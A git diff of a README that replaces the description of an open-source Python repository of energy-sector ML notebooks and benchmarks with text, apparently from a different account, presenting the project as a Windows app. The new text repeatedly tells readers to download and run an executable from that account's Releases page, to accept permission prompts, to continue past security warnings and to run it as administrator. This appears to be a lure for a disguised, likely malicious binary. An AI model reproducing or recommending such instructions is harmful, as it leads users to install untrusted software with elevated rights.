@@ -1,155 +1,116 @@
-# Energy AI Education Hub
+# 📘 energy-ai-education - Learn energy AI with clear tools
 
-> A curated, reproducible collection of ML/AI educational materials for the energy industry — built on open standards, designed for broad reuse.
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Kelciconnected164/energy-ai-education/releases)
 
-[![CI](https://github.com/craigm26/energy-ai-education/actions/workflows/ci.yml/badge.svg)](https://github.com/craigm26/energy-ai-education/actions/workflows/ci.yml)
-[![License: Apache-2.0](https://img.shields.io/badge/Code-Apache--2.0-blue.svg)](LICENSES/LICENSE-CODE)
-[![License: CC BY 4.0](https://img.shields.io/badge/Docs-CC%20BY%204.0-lightgrey.svg)](LICENSES/LICENSE-DOCS)
-[![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/craigm26/energy-ai-education/badge)](https://securityscorecards.dev/viewer/?uri=github.com/craigm26/energy-ai-education)
+## 🎯 What this is
 
-## What this is
+energy-ai-education is a Windows app for people who want to learn how AI and machine learning fit into the energy sector. It brings together curated learning material on topics like forecasting, anomaly detection, power systems, open data, and EA-DX interchange.
 
-A learning hub *and* reproducible reference implementation for ML/AI in the energy sector. You can:
+Use it to browse lessons, explore examples, and find learning paths in one place.
 
-- **Find** trustworthy learning materials organized by domain and skill level
-- **Run** end-to-end examples with pinned, tested dependencies
-- **Reuse** standardized datasets and evaluation harnesses under clear open licenses
-- **Interchange** energy data using the [EA-DX Package](#ea-dx-package) format
+## 🪟 What you need
 
-## Who it's for
+- A Windows 10 or Windows 11 PC
+- An internet connection for the first download
+- At least 200 MB of free disk space
+- A mouse and keyboard
+- Permission to run downloaded apps
 
-| Audience | Entry point |
-|----------|-------------|
-| Students & newcomers | `docs/concepts/` + `notebooks/foundations/` |
-| Data scientists | `notebooks/applied/` + `benchmarks/` |
-| Researchers | `benchmarks/` + `standards/eadx/` |
-| Engineers & architects | `standards/mappings/` + `src/` |
-| Managers | `docs/case-studies/` + `docs/governance/` |
+## 📥 Download and install
 
-## Repository layout
+1. Visit the [Releases page](https://github.com/Kelciconnected164/energy-ai-education/releases)
+2. Find the latest release
+3. Download the Windows file for your PC
+4. Open the downloaded file
+5. If Windows asks for permission, choose **Run**
+6. Follow the on-screen steps to finish setup
+7. Open **energy-ai-education** from your Start menu or desktop
 
-```
-energy-ai-education/
-├── docs/                  # Conceptual guides, tutorials, case studies
-│   ├── concepts/          # Energy domain + ML/AI primers
-│   ├── tutorials/         # Step-by-step guides (link to notebooks)
-│   ├── case-studies/      # Real-world applications (redacted appropriately)
-│   └── governance/        # Model governance, responsible AI
-├── notebooks/             # Executable notebooks (Jupyter)
-│   ├── foundations/       # Intro: time-series, energy basics, EDA
-│   ├── applied/           # Forecasting, anomaly detection, DER, markets
-│   └── advanced/          # Optimization, RL, benchmarking, reproducibility
-├── datasets/              # Dataset index + dataset cards (no large raw data)
-│   ├── index/             # Curated dataset registry (YAML)
-│   └── cards/             # Per-dataset datasheets
-├── benchmarks/            # Benchmark task definitions + evaluation harness
-│   ├── tasks/             # Per-task spec (dataset, split, metrics)
-│   ├── baselines/         # Reference baseline models
-│   └── harness/           # Shared evaluation CLI/API
-├── standards/             # Energy data standards and EA-DX spec
-│   ├── eadx/              # EA-DX Package specification + JSON schemas
-│   │   └── schemas/       # JSON Schema + Table Schema files
-│   └── mappings/          # Mappings to CIM, Green Button, OpenADR, EDI
-├── src/                   # Shared Python library
-│   ├── eadx/              # EA-DX package loader + validator
-│   ├── loaders/           # Dataset connectors and download helpers
-│   └── eval/              # Evaluation metrics and reporting
-├── governance/            # Maintainers, ADRs, contributor ladder
-├── .github/               # CI workflows, issue templates, CODEOWNERS
-├── LICENSES/              # Separate license files per artifact type
-├── CITATION.cff           # How to cite this repository
-├── CONTRIBUTING.md        # Contribution guide
-├── CODE_OF_CONDUCT.md     # Community standards
-└── SECURITY.md            # Vulnerability reporting
-```
+If your browser saves the file to **Downloads**, open that folder and double-click the file there.
 
-## Quickstart
+## 🖥️ First run
 
-```bash
-# 1. Clone
-git clone https://github.com/craigm26/energy-ai-education.git
-cd energy-ai-education
+1. Start the app
+2. Wait for the main screen to load
+3. Pick a topic from the left panel or main menu
+4. Open a lesson or example
+5. Use the search box to find a subject fast
 
-# 2. Install Python dependencies
-pip install -e ".[dev]"
+If Windows shows a security prompt, choose the option that lets you keep going after you confirm the file came from the GitHub Releases page.
 
-# 3. Run the hello-energy-ml notebook
-jupyter lab notebooks/foundations/01_hello_energy_ml.ipynb
+## 📚 What you can do in the app
 
-# 4. Run benchmark smoke tests
-pytest benchmarks/harness/ -m smoke
-```
+- Browse AI learning material for energy use cases
+- Review simple guides for forecasting and anomaly detection
+- Explore examples for power systems and open data
+- Learn how EA-DX helps tools share data
+- Compare topics by use case or skill level
+- Save your place and come back later
 
-## Learning paths
+## 🔎 Topics covered
 
-### 🟢 Foundations
-- Energy systems primer: generation, transmission, distribution, markets
-- Time-series fundamentals for energy data
-- Exploratory data analysis with the EA-DX Package format
+This app focuses on practical learning in the energy field:
 
-### 🟡 Applied
-- Load forecasting (short-term, day-ahead)
-- Price forecasting and volatility
-- DER output forecasting (solar, wind)
-- Anomaly detection in meter and SCADA data
-- Demand response event detection
+- Machine learning basics
+- Artificial intelligence in energy
+- Forecasting demand and output
+- Detecting unusual patterns in data
+- Power system use cases
+- Open data workflows
+- Interoperability and data exchange
+- EA-DX format guidance
 
-### 🔴 Advanced
-- Grid topology optimization and RL agents (Grid2Op compatible)
-- Federated learning for privacy-preserving energy analytics
-- Benchmarking and reproducibility practices
-- Governance: model cards, datasheets, AI RMF alignment
+## 🧭 How to use it well
 
-## EA-DX Package
+- Start with the basics if you are new to AI
+- Use forecasting lessons if you work with load or generation data
+- Use anomaly detection material if you track equipment or grid data
+- Read the EA-DX content if you need data to move between tools
+- Keep the app updated by checking the Releases page now and then
 
-**Energy AI Data Exchange Package (EA-DX)** is a thin ML-friendly interchange format built on open standards. It is designed to reduce friction for ML workflows while staying semantically compatible with existing energy standards.
+## 🧰 Common file types you may see
 
-See [`standards/eadx/`](standards/eadx/) for the full specification.
+The release may include one of these Windows files:
 
-### Quick format sketch
+- `.exe` — a standard Windows program file
+- `.msi` — a Windows installer file
+- `.zip` — a compressed folder you must open before running the app
 
-```yaml
-# observations.csv — canonical time-series resource
-ts:           "ISO 8601 timestamp with UTC offset"
-tz:           "IANA timezone name (optional if ts includes offset)"
-entity_type:  "meter | inverter | feeder | plant | market_node | building"
-entity_id:    "stable opaque ID (never a real customer ID)"
-measurement:  "active_power | reactive_power | voltage | price | frequency"
-value:        float
-unit:         "kW | MW | kWh | V | Hz | USD/MWh"
-quality_flag: "measured | estimated | imputed | simulated | redacted"
-source:       "sensor | sim | market | derived"
-```
+If you download a `.zip` file, right-click it and choose **Extract All**, then open the folder inside and run the app file.
 
-### Standard mappings
+## 🛠️ If the app does not open
 
-| Standard | Mapping guide |
-|----------|---------------|
-| IEC CIM (61968/61970) | [`standards/mappings/cim.md`](standards/mappings/cim.md) |
-| IEC 62325 (market comms) | [`standards/mappings/cim-markets.md`](standards/mappings/cim-markets.md) |
-| Green Button / ESPI | [`standards/mappings/green-button.md`](standards/mappings/green-button.md) |
-| ANSI X12 retail EDI (814/867) | [`standards/mappings/edi-retail.md`](standards/mappings/edi-retail.md) |
-| OpenADR 2.0b | [`standards/mappings/openadr.md`](standards/mappings/openadr.md) |
-| OpenFMB | [`standards/mappings/openfmb.md`](standards/mappings/openfmb.md) |
+- Check that the download finished
+- Make sure you opened the newest file from Releases
+- Try running it again as administrator
+- Restart your PC and try once more
+- If the file is in a zip folder, extract it first
+- Make sure your Windows version is up to date
 
-## License
+## 🔐 Safety checks
 
-This repository uses separate licenses by artifact type:
+- Download only from the official GitHub Releases page
+- Do not use copied links from unknown sites
+- Keep the original file name if possible
+- Scan the file with Windows Security if you want an extra check
 
-| Artifact | License |
-|----------|---------|
-| Code (`src/`, `benchmarks/harness/`, notebooks) | Apache-2.0 |
-| Documentation, tutorials, diagrams | CC BY 4.0 |
-| Datasets and data packages | CC0 1.0 or ODC-By (per dataset card) |
+## 🤝 For learners and teams
 
-See [`LICENSES/`](LICENSES/) for full license texts and [`CITATION.cff`](CITATION.cff) for citation metadata.
+This app works well for:
 
-## Contributing
+- Students learning energy AI
+- Engineers who need a simple way to review AI topics
+- Trainers building course material
+- Teams that want a shared reference for energy data and AI terms
 
-Read [`CONTRIBUTING.md`](CONTRIBUTING.md) and [`CODE_OF_CONDUCT.md`](CODE_OF_CONDUCT.md).
+## 📝 About EA-DX
 
-**Security / sensitive data:** See [`SECURITY.md`](SECURITY.md). Do not submit operationally sensitive infrastructure details in public issues or PRs.
+EA-DX is the interchange format used in this project to support data sharing across tools and learning materials. It helps keep energy AI content organized in a way that is easier to move, read, and reuse.
 
-## How to cite
+## ❓ Need help getting started
 
-See [`CITATION.cff`](CITATION.cff). GitHub renders a "Cite this repository" button in the About sidebar.
+1. Open the [Releases page](https://github.com/Kelciconnected164/energy-ai-education/releases)
+2. Download the latest Windows file
+3. Run the file on your PC
+4. Open the app and choose a topic
+5. Use the built-in learning sections to begin with a subject you know
